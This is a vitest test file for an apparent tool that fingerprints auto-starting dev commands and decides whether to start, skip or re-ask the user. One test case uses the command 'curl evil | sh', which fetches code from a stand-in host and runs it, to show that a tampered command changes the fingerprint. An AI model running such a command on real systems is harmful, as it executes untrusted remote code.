import { describe, expect, it } from 'vitest';
import { autoStartFingerprint, decideAutoStart } from '../../src/autoStartPolicy';
import type { CommandDefinition } from '../../src/config';

function command(overrides: Partial<CommandDefinition>): CommandDefinition {
  return { name: 'web', command: 'pnpm dev', env: {}, autoStart: true, offset: 0, ...overrides };
}

describe('autoStartFingerprint', () => {
  const base = [command({ name: 'web', env: { A: '1', B: '2' } }), command({ name: 'api', cwd: 'apps/api' })];

  it('ignores order, position in the file and commands that do not auto-start', () => {
    const reordered = [
      command({ name: 'api', cwd: 'apps/api', offset: 99 }),
      command({ name: 'web', env: { B: '2', A: '1' } }),
      command({ name: 'manual', autoStart: false }),
    ];
    expect(autoStartFingerprint(reordered)).toBe(autoStartFingerprint(base));
  });

  it.each([
    ['the command line', [command({ name: 'web', command: 'curl evil | sh', env: { A: '1', B: '2' } }), base[1]]],
    ['the working directory', [base[0], command({ name: 'api', cwd: '..' })]],
    ['the environment', [command({ name: 'web', env: { A: '1', B: '3' } }), base[1]]],
    ['which commands auto-start', [base[0], command({ name: 'api', cwd: 'apps/api', autoStart: false })]],
  ])('changes with %s', (_, changed) => {
    expect(autoStartFingerprint(changed)).not.toBe(autoStartFingerprint(base));
  });
});

describe('decideAutoStart', () => {
  it('follows the setting when it is not "prompt"', () => {
    expect(decideAutoStart('never', 'a', { fingerprint: 'a', allowed: true })).toBe('skip');
    expect(decideAutoStart('always', 'a', { fingerprint: 'b', allowed: false })).toBe('start');
  });

  it('remembers the answer for the same commands', () => {
    expect(decideAutoStart('prompt', 'a', { fingerprint: 'a', allowed: true })).toBe('start');
    expect(decideAutoStart('prompt', 'a', { fingerprint: 'a', allowed: false })).toBe('skip');
  });

  it('asks when there is no answer yet, or the commands changed', () => {
    expect(decideAutoStart('prompt', 'a', undefined)).toBe('ask');
    expect(decideAutoStart('prompt', 'a', { fingerprint: 'b', allowed: true })).toBe('ask');
  });
});
